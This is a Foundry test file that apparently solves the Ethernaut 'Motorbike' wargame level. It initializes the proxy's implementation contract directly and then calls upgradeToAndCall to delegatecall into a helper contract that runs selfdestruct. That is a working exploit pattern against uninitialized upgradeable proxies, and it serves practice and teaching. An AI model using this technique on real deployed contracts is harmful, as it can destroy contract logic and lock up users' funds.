pragma solidity >=0.8.19;

import { Test } from "forge-std/Test.sol";
import { Motorbike, Engine, BikeExy } from "src/Motorbike/Motorbike.sol";
import { Ethernaut } from "src/Ethernaut.sol";
import "forge-std/console2.sol";

contract MotorbikeTest is Test {
    Ethernaut ethernaut;
    address me = makeAddr("me");

    function setUp() external {
        ethernaut = new Ethernaut();
    }

    function testMotorbikeHack() external {
        // level setup
        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));
        BikeExy bikeExy = new BikeExy();

        // the goal
        engine.initialize();

        // Get data required for the upgrade to and call method
        bytes memory initEncoded = abi.encodeWithSignature("initialize()");

        // upgrade to and call will delegate call to bikeExy which will run selfdestruct
        engine.upgradeToAndCall(address(bikeExy), initEncoded);

        // level check
    }
}
